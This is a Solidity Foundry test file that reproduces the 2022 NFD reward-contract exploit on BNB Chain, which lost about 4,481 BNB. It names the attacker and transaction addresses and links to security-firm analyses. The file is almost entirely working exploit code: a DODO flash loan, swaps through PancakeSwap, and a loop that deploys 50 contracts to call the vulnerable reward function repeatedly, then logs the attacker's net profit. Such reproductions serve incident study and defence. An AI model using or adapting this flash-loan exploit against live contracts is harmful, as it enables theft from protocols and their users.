// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 4481 BNB (~125M US$)
// Attacker : 0x22c9736d4fc73a8fa0eb436d2ce919f5849d6fd2
// Attack Contract : 0xa35ef9fa2f5e0527cb9fbb6f9d3a24cfed948863
// Vulnerable Contract : 0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e
// Attack Tx1 : 0x1fea385acf7ff046d928d4041db017e1d7ead66727ce7aacb3296b9d485d4a26 (-2952.97 BNB)
// Attack Tx2 : 0xb6f9b5ef1feeadb379a2de8f79bb04dd6920bfb214136d057eed4ce23a0003f8 (-1412.77 BNB)
// Attack Tx3 : 0x8b77d75efa185295b09bdf2edcb509541fdde40ed5484212331ceac41b2f4ac0 (-115.57  BNB)

// @Info
// WBNB-USDT Pair : 0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae
// USDT-NFD Pair  : 0x26c0623847637095655b2868c3182b2285bdaeaf

// @Analysis
// PeckShield : https://twitter.com/peckshield/status/1567710274244825088
// Beosin : https://twitter.com/BeosinAlert/status/1567757251024396288
// Blocksec : https://twitter.com/BlockSecTeam/status/1567706201277988866
// SlowMist : https://twitter.com/SlowMist_Team/status/1567854876633309186
// CertiK : https://mp.weixin.qq.com/s/xGQ9SIxrwOizog3XDnM5iw

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant vulnContract = 0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E;

contract Attacker is Test {
    IPancakeRouter constant PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant dodo = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;
    address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;

    function setUp() public {
        cheat.createSelectFork("bsc", 21_140_434);
        console.log("---------- Reproduce Attack Tx1 ----------");
        cheat.label(address(PancakeRouter), "PancakeRouter");
        cheat.label(vulnContract, "vulnContractName");
        cheat.label(wbnb, "WBNB");
        cheat.label(dodo, "DODO");
        cheat.label(usdt, "USDT");
        cheat.label(nfd, "NFD");
    }

    function testExploit() public {
        console.log("Flashloan 250 WBNB from DODO DLP...");
        bytes memory data = abi.encode(dodo, wbnb, 250 * 1e18);
        DVM(dodo).flashLoan(0, 250 * 1e18, address(this), data);
    }

    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        require(IERC20(wbnb).balanceOf(address(this)) == quoteAmount, "Invalid WBNB amount");
        require(quoteAmount == 250 * 1e18, "Invalid WBNB amount");

        console.log("Swap 250 WBNB to NFD...");
        address[] memory path = new address[](3);
        path[0] = wbnb;
        path[1] = usdt;
        path[2] = nfd;
        IERC20(wbnb).approve(address(PancakeRouter), type(uint256).max);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            quoteAmount, 0, path, address(this), block.timestamp
        );

        emit log_named_decimal_uint("[*] NFD balance before attack", IERC20(nfd).balanceOf(address(this)), 18);

        console.log("Abuse the Reward Contract...");
        for (uint8 i; i < 50; i++) {
            Exploit exploit = new Exploit();
            uint256 nfdAmount = IERC20(nfd).balanceOf(address(this));
            IERC20(nfd).transfer(address(exploit), nfdAmount);
            exploit.abuse();
        }

        emit log_named_decimal_uint("[*] NFD balance after attack", IERC20(nfd).balanceOf(address(this)), 18);

        console.log("Swap the profit...");
        uint256 nfdBalance = IERC20(nfd).balanceOf(address(this));
        path[0] = nfd;
        path[1] = usdt;
        path[2] = wbnb;
        IERC20(nfd).approve(address(PancakeRouter), type(uint256).max);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            nfdBalance, 0, path, address(this), block.timestamp
        );

        console.log("Repay the flashloan...");
        IERC20(wbnb).transfer(msg.sender, 250 * 1e18);

        emit log_named_decimal_uint("Attacker's Net Profit", IERC20(wbnb).balanceOf(address(this)), 18);
    }
}

contract Exploit is Test {
    address constant rewardContract = vulnContract;
    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;

    // Function 0xe2f9d09c
    function abuse() external {
        rewardContract.call(abi.encode(bytes4(0x6811e3b9)));
        uint256 bal = IERC20(nfd).balanceOf(address(this));
        require(IERC20(nfd).transfer(msg.sender, bal), "Transfer profit failed");
    }
}

